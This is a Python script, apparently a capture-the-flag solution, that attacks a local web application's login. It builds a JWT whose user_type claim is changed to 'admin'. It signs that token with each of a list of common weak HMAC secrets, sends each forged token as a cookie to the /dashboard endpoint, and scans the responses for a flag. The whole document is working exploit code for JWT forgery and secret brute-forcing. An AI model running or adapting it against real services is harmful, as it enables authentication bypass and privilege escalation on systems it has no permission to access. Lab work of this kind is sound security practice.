import requests
import re
import base64
import json
import hmac
import hashlib

base_url = "http://127.0.0.1:32883"

# Original JWT payload
original_payload = {
    "username": "test",
    "user_id": 10032,
    "user_type": "customer"
}

# Modified payload with admin user_type
admin_payload = {
    "username": "test",
    "user_id": 10032,
    "user_type": "admin"
}

# JWT header
header = {"alg": "HS256", "typ": "JWT"}

# Encode header and payload
def base64url_encode(data):
    return base64.urlsafe_b64encode(json.dumps(data, separators=(',', ':')).encode()).decode().rstrip('=')

encoded_header = base64url_encode(header)
encoded_payload = base64url_encode(admin_payload)

print(f"[*] Creating JWT with user_type='admin'\n")
print(f"Header: {json.dumps(header)}")
print(f"Payload: {json.dumps(admin_payload)}")
print(f"\nEncoded header: {encoded_header}")
print(f"Encoded payload: {encoded_payload}")

# Common weak secrets to try
secrets = [
    'secret',
    'Secret',
    'SECRET',
    'key',
    'password',
    'admin',
    'test',
    '123456',
    'flask',
    'trading',
    'jwt_secret',
    '',
    'secret_key',
    'supersecret',
    'trading_platform',
    'changeme',
]

print(f"\n[*] Trying {len(secrets)} common HMAC secrets...\n")

for secret in secrets:
    # Create signature
    message = f"{encoded_header}.{encoded_payload}"
    signature = hmac.new(
        secret.encode(),
        message.encode(),
        hashlib.sha256
    ).digest()
    encoded_signature = base64.urlsafe_b64encode(signature).decode().rstrip('=')
    
    # Build JWT
    forged_jwt = f"{message}.{encoded_signature}"
    
    # Test with this JWT
    session = requests.Session()
    session.cookies.set('auth_token', forged_jwt)
    session.cookies.set('session', 'eyJ1c2VyX2lkIjoxMDAzMn0.aVrymg.NNu-yKH1YrDsSG7Z3eGkZsI1CT0')
    
    resp = session.get(f"{base_url}/dashboard", allow_redirects=False)
    
    # Check response
    if resp.status_code == 200:
        print(f"[SUCCESS] Secret: '{secret}' → Status: {resp.status_code}")
        print(f"  JWT: {forged_jwt[:80]}...")
        print(f"  Response length: {len(resp.content)}B")
        
        # Check for FLAG
        flag_match = re.search(r'FLAG\{[^}]+\}', resp.text)
        if flag_match:
            print(f"  [!] FLAG FOUND: {flag_match.group(0)}")
            print(f"\n{'='*80}")
            print("Full Response:")
            print(resp.text)
            print(f"{'='*80}")
        else:
            print(f"  Response preview: {resp.text[:300]}")
    elif resp.status_code != 302:
        # Not success and not redirect = interesting
        print(f"[INFO] Secret: '{secret}' → Status: {resp.status_code}")

print(f"\n[*] Tested {len(secrets)} secrets")

